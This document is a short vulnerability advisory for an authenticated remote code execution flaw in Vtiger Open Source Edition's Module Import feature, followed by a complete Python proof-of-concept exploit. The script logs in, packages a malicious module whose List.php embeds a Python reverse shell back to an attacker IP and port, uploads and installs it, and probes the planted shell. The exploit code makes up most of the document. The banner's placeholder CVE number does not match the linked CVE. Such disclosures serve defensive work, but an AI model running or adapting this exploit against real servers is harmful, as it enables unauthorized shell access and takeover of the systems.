Vtiger Open Source Edition <= v8.3.0 has a privileged authenticated RCE, via the Module Import feature
The "Module Import" feature allows privileged authenticated users to upload ZIP files containing module files.
The system fails to properly validate uploaded ZIP contents, allowing an attacker to include a malicious PHP file.
Once uploaded, the attacker can directly access and execute the PHP file, achieving remote code execution (RCE) on the server.

System: https://www.vtiger.com/open-source-crm/
CVE: https://www.simonjuguna.com/cve-2025-45753-authenticated-remote-code-execution-vulnerability-in-vtiger-open-source-edition-v8-3-0/

################################### Python PoC ################################
import requests
from bs4 import BeautifulSoup
import re
import os
import shutil
import random
import string
import zipfile

# ASCII Banner
print("""
--------------------------------------------------
|    vTiger Community Edition RCE Exploit        |
|    CVE-2025-xxxxxx (<8.3.0)                    |
|    Credits: Simon Njuguna                      |
--------------------------------------------------
""")

# -------------------- Configuration --------------------
base_url = "http://localhost:8080"  # Vtiger url
username = "admin"                  # vtiger admin
password = "admin"                  # vtiger admin password
ip = "192.168.58.132"               # Reverse shell IP
port = 4444                         # Reverse shell port
zip_file_path = "module.zip"        # Output ZIP file
# ------------------------------------------------------

# Generate random module name
random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
module_name = f"module_{random_str}"

# Manifest.xml content
manifest_content = f"""<?xml version="1.0"?>
<module>
    <type>extension</type>
    <name>{module_name}</name>
    <label>{module_name}</label>
    <parent>Tools</parent>
    <version>1.0</version>
    <dependencies>
        <vtiger_version>7.0.0</vtiger_version>
        <vtiger_max_version>8.*</vtiger_max_version>
    </dependencies>
</module>"""

# List.php content with reverse shell
list_php_content = f"""<?php
$ip = "{ip}";
$port = {port};
exec("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
s.connect((\\"$ip\\",$port)); 
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2); subprocess.call([\\"/bin/sh\\",\\"-i\\"])';");
?>
<?php
class {module_name}_List_View extends Vtiger_Index_View {{
    public function process(Vtiger_Request $request) {{
        $viewer = $this->getViewer($request);
        $viewer->view('List.tpl', $request->getModule());
    }}
}}
"""

# Step 0: Check permissions and create ZIP
def create_module_zip():
    temp_dir = "temp_module"
    module_dir = f"{temp_dir}/modules/{module_name}/views"

    # Check write permissions
    if not os.access(".", os.W_OK):
        print("[-] No write permissions in current directory.")
        print("[!] Please run the script in a directory with write permissions.")
        exit()

    # Clean up any existing temp_dir
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(module_dir, exist_ok=True)

    # Write manifest.xml
    with open(f"{temp_dir}/manifest.xml", "w") as f:
        f.write(manifest_content)

    # Write List.php
    with open(f"{module_dir}/List.php", "w") as f:
        f.write(list_php_content)

    # Create ZIP with exact structure
    with zipfile.ZipFile(zip_file_path, "w", zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(f"{temp_dir}/manifest.xml", "manifest.xml")
        zipf.write(f"{module_dir}/List.php", f"modules/{module_name}/views/List.php")

    # Clean up temp directory
    shutil.rmtree(temp_dir)
    print(f"[+] Generated module ZIP: {zip_file_path} with name {module_name}")

# Create the ZIP file
create_module_zip()

# Start session
session = requests.Session()

# Step 1: Login
r = session.get(f"{base_url}/index.php")
csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name": "__vtrftk"})["value"]
csrf_parts = csrf.split(",")
login_sid = csrf_parts[0].split(":")[-1]
login_csrf_token = csrf_parts[-1]

login_data = {
    "__vtrftk": csrf,
    "username": username,
    "password": password,
    "module": "Users",
    "action": "Login"
}
resp = session.post(f"{base_url}/index.php", data=login_data)
if resp.status_code == 200 and any(x in resp.text for x in ["Dashboard", "Logout"]):
    print("[+] Login successful.")
else:
    print("[-] Login failed.")
    exit()

# Step 2: Upload module
r = session.get(f"{base_url}/index.php?module=ModuleManager&parent=Settings&view=ModuleImport&mode=importUserModuleStep1")
csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name": "__vtrftk"})["value"]
upload_sid = csrf.split(",")[0].split(":")[-1]
upload_csrf_token = csrf.split(",")[-1]

with open(zip_file_path, "rb") as file:
    files = {"moduleZip": (os.path.basename(zip_file_path), file, "application/zip")}
    data = {
        "__vtrftk": csrf,
        "module": "ModuleManager",
        "parent": "Settings",
        "view": "ModuleImport",
        "mode": "importUserModuleStep2",
        "moduleAction": "Import",
        "acceptDisclaimer": "on"
    }
    r = session.post(f"{base_url}/index.php", files=files, data=data)

if "usermodule_" in r.text:
    print("[+] Module upload successful.")
else:
    print("[-] Upload failed.")
    exit()

# Step 3: Extract ZIP name
zip_file = re.findall(r"usermodule_.*?\.zip", r.text)
if not zip_file:
    print("[-] Couldn't find uploaded file name.")
    exit()
uploaded_zip = zip_file[0]

# Step 4: Install module
install_data = {
    "__vtrftk": f"sid:{upload_sid},{upload_csrf_token}",
    "module": "ModuleManager",
    "parent": "Settings",
    "action": "Basic",
    "mode": "importUserModuleStep3",
    "module_import_file": uploaded_zip,
    "module_import_type": "extension",
    "module_import_name": module_name
}
r = session.post(f"{base_url}/index.php", data=install_data, headers={"Content-Type": "application/x-www-form-urlencoded"})
if "success" in r.text.lower() or "imported" in r.text.lower():
    print("[+] Module installed successfully.")
    shell_path = f"{base_url}/modules/{module_name}/views/List.php"
    print(f"[!] Shell deployed! Check your listener at {ip}:{port}")
    try:
        shell_check = session.get(shell_path, timeout=3)
        if shell_check.status_code == 200:
            print(f"[+] Shell confirmed: {shell_path}")
        else:
            print(f"[?] Shell might be at: {shell_path} (status: {shell_check.status_code})")
    except requests.exceptions.RequestException:
        print(f"[*] Shell should be live at: {shell_path}")
else:
    print("[-] Install failed.")
    print(r.text)
    exit()

# Clean up ZIP file
os.remove(zip_file_path)
print("[+] Cleaned up temporary ZIP file.")
